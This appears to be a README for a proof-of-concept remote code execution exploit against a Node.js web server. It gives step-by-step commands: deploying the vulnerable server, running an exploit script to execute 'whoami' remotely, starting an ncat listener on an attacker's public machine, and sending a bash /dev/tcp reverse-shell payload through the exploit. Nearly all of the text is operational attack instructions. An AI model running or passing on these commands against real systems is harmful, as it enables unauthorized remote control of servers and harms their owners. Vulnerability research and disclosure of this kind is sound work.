# 1. Start vulnerability server
Upload source code to server that installed with `node 24`, `pnpm` and run:
```bash
pnpm install
pnpm start
```

# 2. RCE exploit, run it at local terminal
Download source code to local machine and run:
```bash
bash ./exploit-redirect.sh https://<webserver-domain> "whoami"
```

# 3. Running reverse shell listener
Install `ncat` in hacker machine that has public ip and run:
```bash
ncat -lvnp 4000
```

# 4. Reverse shell exploit
Run the following command at local terminal:
```
bash ./exploit-redirect.sh https://<webserver-domain> "sh -i >& /dev/tcp/<hacker-machine-public-ip>/4000 0>&1 &"
```
